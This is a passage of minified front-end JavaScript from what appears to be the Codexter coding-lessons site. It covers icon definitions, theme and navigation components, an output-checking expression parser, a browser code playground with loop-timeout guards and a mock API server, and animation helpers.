 */const rx={name:"swords",size:24,node:[["path",{d:"m13 19 6-6",key:"gj6q8g"}],["path",{d:"M14.5 17.5 3.586 6.586A2 2 0 013 5.172V3h2.172a2 2 0 011.414.586L17.5 14.5",key:"uwfxh8"}],["path",{d:"m14.828 6.172 2.586-2.586A2 2 0 0118.828 3H21v2.172a2 2 0 01-.586 1.414l-2.586 2.586",key:"1f17hx"}],["path",{d:"m16 16 4 4",key:"up5ibb"}],["path",{d:"m19 21 2-2",key:"1phfkn"}],["path",{d:"m5 14 4 4",key:"1gk0qx"}],["path",{d:"m5 21-2-2",key:"1kw20b"}],["path",{d:"M7.5 16.5 4 20",key:"14nozp"}]]};rx.node;const $q=ls(rx);/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const ix={name:"trophy",size:24,node:[["path",{d:"M10 14.66V17a1 1 0 0 1-1 1 2 2 0 0 0-2 2v2",key:"pwuv1l"}],["path",{d:"M14 14.66V17a1 1 0 0 0 1 1 2 2 0 0 1 2 2v2",key:"1y54w1"}],["path",{d:"M17.916 10H19.5A2.5 2.5 0 0 0 22 7.5V5a1 1 0 0 0-1-1h-3",key:"e30mpu"}],["path",{d:"M4 22h16",key:"57wxv0"}],["path",{d:"M6 9a6 6 0 0 0 12 0V3a1 1 0 0 0-1-1H7a1 1 0 0 0-1 1z",key:"1mhfuq"}],["path",{d:"M6.084 10H4.5A2.5 2.5 0 0 1 2 7.5V5a1 1 0 0 1 1-1h3",key:"i0yafy"}]]};ix.node;const Hq=ls(ix);/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const ox={name:"user-round",size:24,node:[["circle",{cx:"12",cy:"8",r:"5",key:"1hypcn"}],["path",{d:"M20 21a8 8 0 0 0-16 0",key:"rfgkzh"}]],aliases:["user-2"]};ox.node;const Qq=ls(ox),_u=qi("codexter-theme",e=>e==="light"||e==="dark"?e:null,e=>e??"");function Gq(){var e;return(e=window.matchMedia)!=null&&e.call(window,"(prefers-color-scheme: dark)").matches?"dark":"light"}function Kq(){return typeof window>"u"?"light":_u.get()??Gq()}function Yq(e){const t=document.documentElement;t.classList.toggle("dark",e==="dark"),t.style.colorScheme=e}function Xq(){const[e,t]=w.useState(Kq);w.useEffect(()=>{Yq(e)},[e]),w.useEffect(()=>{var o,a;const r=(o=window.matchMedia)==null?void 0:o.call(window,"(prefers-color-scheme: dark)");if(!r)return;const i=()=>{_u.get()||t(r.matches?"dark":"light")};return(a=r.addEventListener)==null||a.call(r,"change",i),()=>{var l;return(l=r.removeEventListener)==null?void 0:l.call(r,"change",i)}},[]);const n=w.useCallback(r=>{_u.set(r),t(r)},[]),s=w.useCallback(()=>n(e==="dark"?"light":"dark"),[n,e]);return{theme:e,setTheme:n,toggle:s}}function Jq({className:e=""}){const{theme:t,toggle:n}=Xq(),s=t==="dark";return p.jsx("button",{type:"button",onClick:n,"aria-label":s?"Switch to light mode":"Switch to dark mode",title:s?"Light mode":"Night mode",className:"flex h-8 w-8 items-center justify-center rounded-full border border-paper-200/70 text-ink-600 transition hover:border-gold-400 hover:text-gold-600 hover:shadow-glow "+e,children:s?p.jsx(zq,{className:"h-4 w-4","aria-hidden":!0}):p.jsx(Uq,{className:"h-4 w-4","aria-hidden":!0})})}function Zq(e){const[t,n]=w.useState(()=>typeof window>"u"||typeof window.matchMedia!="function"?!1:window.matchMedia(e).matches);return w.useEffect(()=>{if(typeof window>"u"||typeof window.matchMedia!="function")return;const s=window.matchMedia(e);n(s.matches);const r=i=>n(i.matches);return typeof s.addEventListener=="function"?(s.addEventListener("change",r),()=>s.removeEventListener("change",r)):(s.addListener(r),()=>s.removeListener(r))},[e]),t}function eO(){return Zq("(max-width: 767px)")}const tO=[{to:"/learn",label:"Lessons",icon:Vq,match:e=>e.startsWith("/learn")},{to:"/playground",label:"Playground",icon:Wq,match:e=>e.startsWith("/playground")},{to:"/clans",label:"Guilds",icon:$q,match:e=>e.startsWith("/clans")},{to:"/leaderboard",label:"Board",icon:Hq,match:e=>e.startsWith("/leaderboard")},{to:"/portfolio",label:"Profile",icon:Qq,match:e=>e.startsWith("/portfolio")}];function nO(){const{user:e,authReady:t}=Li(),{pathname:n}=en(),r=eO()&&t&&!!e;return w.useEffect(()=>{if(!r)return;const i=document.documentElement;return i.classList.add("has-tabbar"),()=>i.classList.remove("has-tabbar")},[r]),r?p.jsx(L.nav,{"aria-label":"Mobile navigation",className:"glass fixed inset-x-0 bottom-0 z-40 border-t border-paper-200/60 pb-[env(safe-area-inset-bottom)] print:hidden md:hidden",initial:{y:96,opacity:0},animate:{y:0,opacity:1},transition:{duration:.45,ease:[.22,1,.36,1]},children:p.jsx("ul",{className:"mx-auto flex max-w-md items-stretch justify-between px-2",children:tO.map(i=>{const o=i.match(n),a=i.icon;return p.jsx("li",{className:"flex-1",children:p.jsxs(Re,{to:i.to,"aria-current":o?"page":void 0,className:"relative flex flex-col items-center gap-0.5 rounded-2xl px-1 py-2.5",children:[o&&p.jsx(L.span,{layoutId:"mobile-tab-pill",className:"absolute inset-x-2 inset-y-1 rounded-2xl bg-gold-400/15",transition:{type:"spring",stiffness:380,damping:32},"aria-hidden":!0}),p.jsx(a,{className:"relative h-5 w-5 transition-colors "+(o?"text-gold-600":"text-ink-500"),strokeWidth:o?2.4:2,"aria-hidden":!0}),p.jsx("span",{className:"relative font-mono text-[10px] uppercase tracking-widest transition-colors "+(o?"font-bold text-ink-950":"text-ink-500"),children:i.label})]})},i.to)})})}):null}const sO={idle:"local only",syncing:"syncing…",synced:"synced",error:"sync error"},rO={idle:"bg-ink-300",syncing:"bg-gold-400 animate-pulse",synced:"bg-gold-500",error:"bg-red-500"},iO=[{to:"/learn",label:"Lessons",active:e=>e.startsWith("/learn")},{to:"/playground",label:"Playground",active:e=>e.startsWith("/playground")},{to:"/projects",label:"Projects",active:e=>e.startsWith("/projects")},{to:"/leaderboard",label:"Leaderboard",active:e=>e.startsWith("/leaderboard")},{to:"/clans",label:"Guilds",active:e=>e.startsWith("/clans")},{to:"/portfolio",label:"Profile",active:e=>e.startsWith("/portfolio")}];function Di(){const e=Za(),[t,n]=w.useState(!1),[s,r]=w.useState(!1),[i,o]=w.useState(!1),a=w.useRef(null),l=en(),{user:c,authReady:u,sync:d,signOutUser:h,resetEverything:m}=Li(),{scrollY:f}=mb();UE(f,"change",x=>o(x>12)),w.useEffect(()=>{if(!t)return;const x=y=>{var g;(g=a.current)!=null&&g.contains(y.target)||n(!1)};return window.addEventListener("mousedown",x),()=>window.removeEventListener("mousedown",x)},[t]);const v=new Set(Object.keys(e.completed).filter(x=>(e.completed[x]??0)>=1).map(Oi)).size;return p.jsxs(p.Fragment,{children:[p.jsxs(L.header,{className:"sticky top-0 z-40 border-b transition-all duration-300 "+(i?"glass border-paper-200/60 shadow-[0_8px_30px_-12px_rgba(11,11,12,0.12)]":"glass border-transparent"),initial:{y:-64,opacity:0},animate:{y:0,opacity:1},transition:{duration:.5,ease:[.22,1,.36,1]},children:[p.jsxs("div",{className:"mx-auto flex max-w-6xl flex-wrap items-center justify-between gap-x-3 px-4 md:h-16 md:flex-nowrap",children:[p.jsxs(Re,{to:"/",className:"group flex h-14 shrink-0 items-center gap-2.5 md:h-16",children:[p.jsx(L.span,{className:"flex h-8 w-8 items-center justify-center rounded-full bg-ink-950 font-mono text-xs font-bold text-gold-400",whileHover:{rotate:[0,-8,8,0],boxShadow:"0 0 24px rgba(212,175,55,0.35)"},transition:{duration:.45},children:"</>"}),p.jsx("span",{className:"font-display text-lg font-semibold tracking-tight text-ink-950",children:"Codexter"})]}),p.jsxs("div",{className:"flex h-14 shrink-0 items-center gap-1.5 md:order-last md:h-16",children:[p.jsx(Jq,{}),p.jsx("button",{type:"button",onClick:()=>r(!0),className:"flex h-8 w-8 items-center justify-center rounded-full border border-paper-200/70 text-ink-600 transition hover:border-gold-400 hover:text-gold-600 hover:shadow-glow","aria-label":"AI tutor settings",children:"⚙️"}),u&&(c?p.jsxs("div",{ref:a,className:"relative",children:[p.jsxs("button",{type:"button",onClick:()=>n(x=>!x),className:"flex items-center gap-2 rounded-full border border-paper-200/70 bg-paper-50/40 py-1.5 pl-3 pr-2 transition hover:border-gold-400 hover:shadow-glow","aria-label":"Account menu",children:[p.jsx("span",{className:"hidden max-w-[140px] truncate text-xs font-medium text-ink-800 md:block",children:c.displayName||c.email}),p.jsx("span",{className:"flex h-6 w-6 items-center justify-center rounded-full bg-ink-950 font-display text-xs font-bold text-gold-400",children:(c.displayName||c.email||"?").charAt(0).toUpperCase()})]}),p.jsx(Pu,{children:t&&p.jsxs(L.div,{className:"glass absolute right-0 top-11 w-64 rounded-2xl border border-paper-200/60 p-2 shadow-lift",initial:{opacity:0,y:-8,scale:.96},animate:{opacity:1,y:0,scale:1},exit:{opacity:0,y:-8,scale:.96},transition:{duration:.18,ease:[.22,1,.36,1]},style:{transformOrigin:"top right"},children:[p.jsxs("div",{className:"px-3 pb-2 pt-2",children:[p.jsx("p",{className:"truncate text-sm font-semibold text-ink-950",children:c.displayName||"Learner"}),p.jsx("p",{className:"truncate font-mono text-xs text-ink-600",children:c.email}),p.jsxs("p",{className:"mt-2 flex items-center gap-1.5 font-mono text-[11px] text-ink-600",children:[p.jsx("span",{className:"h-1.5 w-1.5 rounded-full "+rO[d]}),sO[d]]})]}),p.jsx("div",{className:"my-1 h-px bg-paper-200/50"}),p.jsx("button",{type:"button",className:"w-full rounded-xl px-3 py-2 text-left text-sm text-ink-800 transition hover:bg-paper-100/80",onClick:async()=>{n(!1),confirm("Reset progress everywhere? This clears your saved scores on this device and in your account.")&&(await m(),window.location.reload())},children:"Reset progress"}),p.jsx("button",{type:"button",className:"w-full rounded-xl px-3 py-2 text-left text-sm text-ink-800 transition hover:bg-paper-100/80",onClick:async()=>{n(!1),await h()},children:"Sign out"})]})})]}):p.jsx(Re,{to:`/auth?returnTo=${encodeURIComponent(l.pathname+l.search)}`,className:"btn-gold !px-4 !py-1.5 !text-sm",children:"Sign in"}))]}),p.jsx("nav",{"aria-label":"Main",className:"no-scrollbar order-last -mx-4 w-[calc(100%+2rem)] overflow-x-auto px-4 pb-2.5 text-sm md:order-none md:mx-0 md:w-auto md:min-w-0 md:flex-1 md:pb-0",children:p.jsxs("div",{className:"flex items-center gap-1.5 md:ml-auto",children:[iO.map(x=>p.jsxs(Re,{to:x.to,className:"relative shrink-0 whitespace-nowrap rounded-full px-4 py-1.5 font-medium transition "+(x.active(l.pathname)?"text-paper-50":"text-ink-700 hover:text-ink-950"),children:[x.active(l.pathname)&&p.jsx(L.span,{layoutId:"nav-pill",className:"absolute inset-0 rounded-full bg-ink-950 shadow-lift",transition:{type:"spring",stiffness:380,damping:32}}),p.jsx("span",{className:"relative z-10",children:x.label})]},x.to)),p.jsxs("span",{className:"hidden shrink-0 items-center gap-1.5 rounded-full border border-paper-200/70 bg-paper-50/50 px-3 py-1.5 font-mono text-xs text-ink-600 sm:flex",children:[p.jsx("span",{className:"gradient-text font-bold",children:v}),"/",Vb," done"]})]})})]}),s&&p.jsx(qq,{onClose:()=>r(!1)})]}),p.jsx(nO,{})]})}function oO(e,t){return{done:e.lessons.filter(s=>Ni(t,e.id+"/"+s.id)>=1).length,total:e.lessons.length}}function aO({track:e}){const t=Za(),{done:n,total:s}=oO(e,t),r=s===0?0:Math.round(n/s*100);return p.jsxs(Re,{to:"/learn/"+e.id+"/"+e.lessons[0].id,className:"glass glass-edge group relative flex h-full flex-col gap-4 overflow-hidden rounded-2xl border border-paper-200/60 p-7 transition-colors duration-300 hover:border-gold-400/50",children:[p.jsx("div",{className:"pointer-events-none absolute inset-0 bg-gradient-to-br from-gold-400/0 to-gold-300/0 opacity-0 transition-opacity duration-300 group-hover:from-gold-400/5 group-hover:to-gold-300/5 group-hover:opacity-100"}),p.jsxs("div",{className:"relative z-10 flex items-start justify-between",style:{transform:"translateZ(24px)"},children:[p.jsx("span",{className:"font-display text-3xl font-bold gradient-text",children:String(Dt.indexOf(e)+1).padStart(2,"0")}),p.jsxs("span",{className:"rounded-full border border-paper-200/60 bg-paper-50/50 px-2.5 py-1 font-mono text-xs text-ink-600",children:[n,"/",s," lessons"]})]}),p.jsxs("div",{className:"relative z-10",style:{transform:"translateZ(16px)"},children:[p.jsx("h3",{className:"font-display text-xl font-semibold text-ink-950 transition group-hover:text-gold-600",children:e.title}),p.jsx("p",{className:"mt-2 text-sm leading-relaxed text-ink-600",children:e.blurb})]}),p.jsxs("div",{className:"relative z-10 mt-auto",style:{transform:"translateZ(20px)"},children:[p.jsx("div",{className:"h-1.5 w-full overflow-hidden rounded-full bg-paper-200/60",children:p.jsx(L.div,{className:"h-full rounded-full bg-gradient-to-r from-gold-500 to-gold-300",initial:{width:0},whileInView:{width:r+"%"},viewport:{once:!0},transition:{duration:.9,ease:[.22,1,.36,1],delay:.2}})}),p.jsx("span",{className:"mt-3 inline-block font-mono text-xs text-gold-600 transition group-hover:translate-x-1",children:"begin →"})]})]})}const lO=["===","!==","==","!=",">=","<=","&&","||","!",">","<",".","(",")","[","]"];function cO(e){const t=[];let n=0;for(;n<e.length;){const s=e[n];if(/\s/.test(s)){n+=1;continue}if(s==="'"||s==='"'){const a=s;let l="";for(n+=1;n<e.length&&e[n]!==a;)if(e[n]==="\\"){n+=1;const c=e[n];if(c===void 0)throw new Error("unterminated escape");l+=c==="n"?`
`:c==="t"?"	":c==="r"?"\r":c,n+=1}else l+=e[n],n+=1;if(n>=e.length)throw new Error("unterminated string");n+=1,t.push({type:"string",value:l});continue}const r=/^\d+(?:\.\d+)?/.exec(e.slice(n));if(r){t.push({type:"number",value:Number(r[0])}),n+=r[0].length;continue}const i=/^[A-Za-z_$][A-Za-z0-9_$]*/.exec(e.slice(n));if(i){t.push({type:"name",value:i[0]}),n+=i[0].length;continue}const o=lO.find(a=>e.startsWith(a,n));if(o){t.push({type:"op",value:o}),n+=o.length;continue}throw new Error(`unexpected character: ${s}`)}return t}function uO(e){const t=cO(e);let n=0;const s=f=>{const v=t[n];return v&&v.type==="op"&&v.value===f?(n+=1,!0):!1},r=f=>{if(!s(f))throw new Error(`expected "${f}"`)},i=()=>{const f=t[n];if(!f||f.type!=="string")throw new Error("expected a string literal");return n+=1,f.value},o=()=>{let f=a();for(;s("||");)f={kind:"or",left:f,right:a()};return f},a=()=>{let f=l();for(;s("&&");)f={kind:"and",left:f,right:l()};return f},l=()=>{const f=c();return s("===")||s("==")?{kind:"equal",negated:!1,left:f,right:c()}:s("!==")||s("!=")?{kind:"equal",negated:!0,left:f,right:c()}:f},c=()=>{const f=u();for(const v of[">","<",">=","<="])if(s(v))return{kind:"compare",op:v,left:f,right:u()};return f},u=()=>s("!")?{kind:"not",value:u()}:d(),d=()=>{let f=h();for(;;){if(s("[")){const v=t[n];if(!v||v.type!=="number"||!Number.isInteger(v.value))throw new Error("expected an integer index");n+=1,r("]"),f={kind:"index",target:f,index:v.value};continue}if(s(".")){const v=t[n];if(!v||v.type!=="name"||v.value!=="trim"&&v.value!=="length")throw new Error("unsupported accessor");if(n+=1,v.value==="length"){f={kind:"length",target:f};continue}r("("),r(")"),f={kind:"trim",target:f};continue}break}return f},h=()=>{if(s("(")){const v=o();return r(")"),v}const f=t[n];if(!f)throw new Error("unexpected end of expression");if(f.type==="string"||f.type==="number")return n+=1,{kind:"literal",value:f.value};if(f.type==="name"){if(f.value==="output"){n+=1,r(".");const v=t[n];if(!v||v.type!=="name")throw new Error("expected an output method");if(n+=1,v.value==="includes"||v.value==="split"||v.value==="indexOf"||v.value==="lastIndexOf"){r("(");const x=i();return r(")"),v.value==="includes"?{kind:"includes",arg:x}:v.value==="split"?{kind:"split",arg:x}:{kind:"indexOf",arg:x,fromEnd:v.value==="lastIndexOf"}}throw new Error(`unsupported output method: ${v.value}`)}if(f.value==="true"||f.value==="false")return n+=1,{kind:"literal",value:f.value==="true"};if(f.value==="null")return n+=1,{kind:"literal",value:null};throw new Error(`unknown identifier: ${f.value}`)}throw new Error("unexpected token")},m=o();if(n!==t.length)throw new Error("trailing input");return m}function $e(e,t){switch(e.kind){case"literal":return e.value;case"includes":return t.includes(e.arg);case"indexOf":return e.fromEnd?t.lastIndexOf(e.arg):t.indexOf(e.arg);case"split":return t.split(e.arg);case"index":{const n=$e(e.target,t);if(typeof n!="string"&&!Array.isArray(n))throw new Error("cannot index this value");return n[e.index]??null}case"trim":{const n=$e(e.target,t);if(typeof n!="string")throw new Error("trim() needs a string");return n.trim()}case"length":{const n=$e(e.target,t);if(typeof n!="string"&&!Array.isArray(n))throw new Error("length needs a string or an array");return n.length}case"not":return!$e(e.value,t);case"and":return!!$e(e.left,t)&&!!$e(e.right,t);case"or":return!!$e(e.left,t)||!!$e(e.right,t);case"compare":{const n=$e(e.left,t),s=$e(e.right,t);if(typeof n!="number"&&typeof n!="string"||typeof s!="number"&&typeof s!="string")throw new Error("comparison needs numbers or strings");switch(e.op){case">":return n>s;case"<":return n<s;case">=":return n>=s;case"<=":return n<=s}}case"equal":{const n=$e(e.left,t),s=$e(e.right,t),r=Array.isArray(n)&&Array.isArray(s)?n.length===s.length&&n.every((i,o)=>i===s[o]):n===s;return e.negated?!r:r}}}const oc=new Map;function dO(e){const t=oc.get(e);if(t)return t;const n=uO(e);return oc.size<500&&oc.set(e,n),n}function hO(e,t){try{return!!$e(dO(e),t)}catch{return!1}}async function pO(e,t=4e3){const n=[],s=(...d)=>{if(n.push(d.map(h=>{if(typeof h=="string")return h;try{return JSON.stringify(h,null,2)??String(h)}catch{return String(h)}}).join(" ")),n.length>500)throw new Error("Output limit reached (500 lines max)")},r=[],i=Date.now()+t,o=()=>{if(Date.now()>i)throw new Error("Script took too long — possible infinite loop!")},a=ax(e),l={log:s,error:s,warn:s,info:s},c=gO(s,r);let u=null;try{new Function("console","__tick__","fetch","setTimeout","setInterval","PromiseLib",`"use strict"; return (async () => {
${a}
})().then((r) => {
  if (r !== undefined) console.log("→ return value:", r);
  return r;
});`)(l,o,c,fO(r),void 0,Promise).catch(v=>{u=v instanceof Error?v.message:String(v)});let m=0;const f=Date.now();for(;Date.now()-f<t+2e3;){const v=r.splice(0);if(v.length)m=0,await Promise.all(v);else{if(m++,m>=40)break;await new Promise(x=>qh(x,5))}}}catch(d){return{logs:n,error:d instanceof Error?d.message:String(d)}}return{logs:n,error:u}}function ax(e){let t="",n=0;const s=r=>r===void 0||/[\s;{})]/.test(r);for(;n<e.length;){const r=/^(for|while)\s*\(/.exec(e.slice(n));if(!r||!s(e[n-1])){t+=e[n],n+=1;continue}const i=r[1];let o=n+i.length;for(;/\s/.test(e[o]??"");)o+=1;if(e[o]!=="("){t+=e[n],n+=1;continue}let a=0;do e[o]==="("?a+=1:e[o]===")"&&(a-=1),o+=1;while(o<e.length&&a>0);const l=o;let c=l;for(;/\s/.test(e[c]??"");)c+=1;if(e[c]==="{")t+=e.slice(n,l)+" { __tick__();",n=c+1;else{let u=c,d=0;for(;u<e.length;){const m=e[u];if(m==="(")d+=1;else if(m===")")d-=1;else if(m===";"&&d===0)break;u+=1}const h=ax(e.slice(c,u+1));t+=e.slice(n,l)+" { __tick__(); "+h+" }",n=u+1}}return t}function fO(e){return(t,n,...s)=>{const r=new Promise(i=>{qh(()=>{t(...s),i()},Math.min(n,3e3))});e.push(r)}}const qh=setTimeout.bind(globalThis),ng={nextId:4,users:[{id:1,name:"Ada",role:"engineer"},{id:2,name:"Lin",role:"designer"},{id:3,name:"Sam",role:"manager"}]},mO=e=>new Promise(t=>{const n=new Promise(s=>qh(s,40+Math.random()*60));e.push(n),n.then(()=>t())});function ze(e,t=200){return{ok:t>=200&&t<300,status:t,statusText:String(t),json:async()=>e,text:async()=>JSON.stringify(e)}}function gO(e,t){return async(n,s)=>{await mO(t);const r=((s==null?void 0:s.method)??"GET").toUpperCase(),i=n.replace(/^https?:\/\/[^/]+/,""),o=ng.users;let a;if(a=i.match(/^\/api\/flaky\/?$/))return Math.random()<.5?ze({error:"random outage"},503):ze({message:"ok",at:Date.now()});if(a=i.match(/^\/api\/users\/?$/)){if(r==="GET")return ze(o);if(r==="POST"){let l={};try{l=JSON.parse((s==null?void 0:s.body)??"{}")}catch{return ze({error:"invalid JSON body"},400)}if(!l.name)return ze({error:"name is required"},400);const c={id:ng.nextId++,name:l.name,role:l.role??"member"};return o.push(c),ze(c,201)}return ze({error:"method not allowed"},405)}if(a=i.match(/^\/api\/users\/(\d+)\/?$/)){const l=Number(a[1]),c=o.findIndex(u=>u.id===l);if(c===-1)return ze({error:"user not found"},404);if(r==="GET")return ze(o[c]);if(r==="DELETE"){const[u]=o.splice(c,1);return ze({deleted:u},200)}return r==="PATCH"||r==="PUT"?(Object.assign(o[c],JSON.parse((s==null?void 0:s.body)??"{}")),ze(o[c])):ze({error:"method not allowed"},405)}return e("(mock server) no route for",r,i),ze({error:"not found"},404)}}function RI(e,t){return hO(e,t)}const sg=`// Try editing this code and press Run
const greet = (name) => \`Hello, \${name}! 👋\`;
console.log(greet("you"));
console.log("2 + 2 =", 2 + 2);
`;function yO(){const[e,t]=w.useState(sg),[n,s]=w.useState(null),[r,i]=w.useState(!1),o=w.useRef(null),a=async()=>{i(!0),s(await pO(e)),i(!1)},l=c=>{if((c.metaKey||c.ctrlKey)&&c.key==="Enter"&&(c.preventDefault(),a()),c.key==="Tab"){c.preventDefault();const u=o.current;if(!u)return;const{selectionStart:d,selectionEnd:h}=u,m=e.slice(0,d)+"  "+e.slice(h);t(m),requestAnimationFrame(()=>u.setSelectionRange(d+2,d+2))}};return p.jsxs("div",{className:"code-window shadow-lift",children:[p.jsxs("div",{className:"flex items-center justify-between border-b border-ink-800 px-4 py-2.5",children:[p.jsxs("div",{className:"flex items-center gap-1.5",children:[p.jsx("span",{className:"h-2.5 w-2.5 rounded-full bg-ink-700"}),p.jsx("span",{className:"h-2.5 w-2.5 rounded-full bg-ink-700"}),p.jsx("span",{className:"h-2.5 w-2.5 rounded-full bg-gold-400"}),p.jsx("span",{className:"ml-2 font-mono text-xs text-ink-600",children:"try-it.js"})]}),p.jsxs("div",{className:"flex gap-2",children:[p.jsx("button",{onClick:()=>{t(sg),s(null)},className:"rounded-full px-3 py-1 font-mono text-xs text-ink-600 transition hover:bg-ink-800 hover:text-paper-100",children:"reset"}),p.jsx("button",{onClick:()=>void a(),disabled:r,className:"rounded-full bg-gold-400 px-4 py-1 font-mono text-xs font-bold text-ink-950 transition hover:bg-gold-300 disabled:opacity-50",children:r?"running…":"▶ Run"})]})]}),p.jsx("textarea",{ref:o,value:e,onChange:c=>t(c.target.value),onKeyDown:l,spellCheck:!1,rows:6,className:"block w-full resize-y bg-ink-950 p-4 font-mono text-[13px] leading-relaxed text-paper-100 outline-none placeholder:text-ink-600",placeholder:"Write some JavaScript…"}),p.jsxs("div",{className:"border-t border-ink-800 bg-ink-950 p-4 font-mono text-[13px] leading-relaxed",children:[!n&&p.jsx("p",{className:"text-ink-600",children:"// press Run or ⌘Enter"}),n==null?void 0:n.logs.map((c,u)=>p.jsxs("div",{className:"whitespace-pre-wrap text-paper-300",children:[p.jsx("span",{className:"mr-2 select-none text-gold-500",children:"›"}),c]},u)),(n==null?void 0:n.error)&&p.jsxs("div",{className:"whitespace-pre-wrap text-red-400",children:["✗ ",n.error]}),n&&!n.error&&n.logs.length===0&&p.jsx("p",{className:"text-ink-600",children:"(no output)"})]})]})}const wO={sm:"h-9 w-9 text-[11px]",md:"h-12 w-12 text-sm",lg:"h-16 w-16 text-lg",xl:"h-28 w-28 text-3xl"};function vO(e){return e.split(/\s+/).filter(Boolean).map(t=>t.charAt(0).toUpperCase()).slice(0,2).join("")||"?"}function bO({name:e,level:t,ascension:n,size:s="md",title:r,className:i=""}){const o=Yb(n,t),a=Xb(r);return p.jsxs("div",{className:"relative shrink-0 "+i,children:[p.jsx("div",{className:"rounded-full bg-gradient-to-br p-[2px] shadow-glow "+o.frame,children:p.jsx("div",{className:"flex items-center justify-center rounded-full bg-ink-950 font-display font-bold tracking-tight text-paper-50 "+wO[s],children:vO(e)})}),p.jsx("span",{title:`Level ${t}${a?" · "+a:""}`,className:"absolute -bottom-1 left-1/2 -translate-x-1/2 rounded-full border border-gold-400/60 bg-ink-950 px-1.5 py-[1px] font-mono text-[9px] font-bold text-gold-300",children:t})]})}function xO({days:e,className:t=""}){const n=e>=7?"text-orange-500":e>=3?"text-orange-400":"text-ink-500";return p.jsxs(L.span,{className:"inline-flex items-center gap-1 font-mono text-xs font-bold "+n+" "+t,title:`${e} day streak`,animate:e>0?{scale:[1,1.14,1]}:void 0,transition:{duration:2.2,repeat:1/0,ease:"easeInOut"},children:[p.jsx("span",{"aria-hidden":!0,children:e>0?"🔥":"·"}),e]})}function kO({rank:e}){const t=e===1?"from-gold-300 to-gold-500 text-ink-950":e===2?"from-paper-300 to-ink-300 text-ink-950":e===3?"from-orange-300 to-orange-500 text-ink-950":"from-paper-100 to-paper-200 text-ink-600";return p.jsx("span",{className:"flex h-8 w-8 items-center justify-center rounded-full bg-gradient-to-br font-mono text-xs font-bold "+t,children:e})}function SO({title:e,tier:t}){const n=Xb(e);return n?p.jsx("span",{className:"rounded-full border border-paper-200 bg-paper-100 px-2 py-0.5 font-mono text-[10px] uppercase tracking-widest "+t.accent,children:n}):null}class Oh extends w.Component{constructor(){super(...arguments);lr(this,"state",{error:null});lr(this,"reset",()=>this.setState({error:null}))}static getDerivedStateFromError(n){return{error:n}}render(){const{error:n}=this.state;if(!n)return this.props.children;const{fallback:s}=this.props;if(s!==void 0)return typeof s=="function"?s(n,this.reset):s;const{title:r,body:i}=Ch(n);return p.jsx(TO,{title:r,message:this.props.message?this.props.message+" "+i:i,onRetry:this.reset})}}function TO({message:e,title:t="offline",onRetry:n}){return p.jsxs("div",{className:"glass glass-edge rounded-2xl border border-paper-200/60 p-8 text-center",children:[p.jsx("p",{className:"font-mono text-xs uppercase tracking-[0.2em] text-gold-600",children:t}),p.jsx("p",{className:"mx-auto mt-3 max-w-xl text-sm leading-relaxed text-ink-600",children:e}),n&&p.jsx("button",{type:"button",onClick:n,className:"btn-ghost mt-5 !px-5 !py-2 text-sm",children:"Try again"})]})}function vt({children:e,delay:t=0,y:n=26,className:s}){return p.jsx(L.div,{className:s,initial:{opacity:0,y:n},whileInView:{opacity:1,y:0},viewport:{once:!0,margin:"-60px"},transition:{duration:.6,delay:t,ease:[.22,1,.36,1]},children:e})}function PI({children:e,className:t}){return p.jsx(L.div,{className:t,initial:{opacity:0,y:14},animate:{opacity:1,y:0},transition:{duration:.5,ease:[.22,1,.36,1]},children:e})}function Ws({children:e,className:t,max:n=9,scale:s=1.02,glare:r=!0,style:i}){const o=w.useRef(null),a=Lt(0),l=Lt(0),c=Lt(1),[u,d]=w.useState({x:50,y:50,o:0}),h={stiffness:220,damping:22,mass:.6},m=kn(a,h),f=kn(l,h),v=kn(c,h);function x(g){const b=o.current;if(!b)return;const k=b.getBoundingClientRect(),C=(g.clientX-k.left)/k.width,E=(g.clientY-k.top)/k.height;l.set((C-.5)*2*n),a.set(-(E-.5)*2*n),c.set(s),d({x:C*100,y:E*100,o:1})}function y(){a.set(0),l.set(0),c.set(1),d(g=>({...g,o:0}))}return p.jsxs(L.div,{ref:o,className:t,style:{...i,rotateX:m,rotateY:f,scale:v,transformStyle:"preserve-3d",transformPerspective:900,position:"relative"},onMouseMove:x,onMouseLeave:y,children:[e,r&&p.jsx("span",{"aria-hidden":!0,className:"pointer-events-none absolute inset-0 rounded-[inherit] transition-opacity duration-300",style:{opacity:u.o,background:`radial-gradient(420px circle at ${u.x}% ${u.y}%, rgba(255,255,255,0.10), transparent 55%)`}})]})}const CO=(e,t,n)=>{const s=t-e;return((n-e)%s+s)%s+e};function rg({children:e,speed:t=40,reverse:n=!1,className:s,fadeColor:r}){const i=w.useRef(null),[o,a]=w.useState(0),l=Lt(0);return w.useEffect(()=>{const c=()=>{var u;return a(((u=i.current)==null?void 0:u.offsetWidth)??0)};return c(),window.addEventListener("resize",c),()=>window.removeEventListener("resize",c)},[]),mR((c,u)=>{if(!o)return;const d=n?1:-1,h=l.get()+d*t*(u/1e3);l.set(CO(-o,0,h))}),p.jsxs("div",{className:"relative overflow-hidden "+(s??""),children:[r&&p.jsxs(p.Fragment,{children:[p.jsx("span",{"aria-hidden":!0,className:"pointer-events-none absolute inset-y-0 left-0 z-10 w-24",style:{background:`linear-gradient(to right, ${r}, transparent)`}}),p.jsx("span",{"aria-hidden":!0,className:"pointer-events-none absolute inset-y-0 right-0 z-10 w-24",style:{background:`linear-gradient(to left, ${r}, transparent)`}})]}),p.jsxs(L.div,{className:"flex w-max items-center will-change-transform",style:{x:l},children:[p.jsx("div",{ref:i,className:"flex items-center",children:e}),p.jsx("div",{className:"flex items-center","aria-hidden":!0,children:e}),p.jsx("div",{className:"flex items-center","aria-hidden":!0,children:e})]})]})}function It({className:e="",size:t=320,duration:n=14,delay:s=0,style:r}){return p.jsx(L.span,{"aria-hidden":!0,className:"pointer-events-none absolute rounded-full blur-3xl "+e,style:{width:t,height:t,...r},animate:{y:[0,-28,12,0],x:[0,18,-12,0],scale:[1,1.06,.97,1]},transition:{duration:n,delay:s,repeat:1/0,ease:"easeInOut"}})}function Fu({children:e,className:t,strength:n=.3}){const s=w.useRef(null),r=Lt(0),i=Lt(0),o=kn(r,{stiffness:300,damping:20}),a=kn(i,{stiffness:300,damping:20});function l(c){const u=s.current;if(!u)return;const d=u.getBoundingClientRect();r.set((c.clientX-(d.left+d.width/2))*n),i.set((c.clientY-(d.top+d.height/2))*n)}return 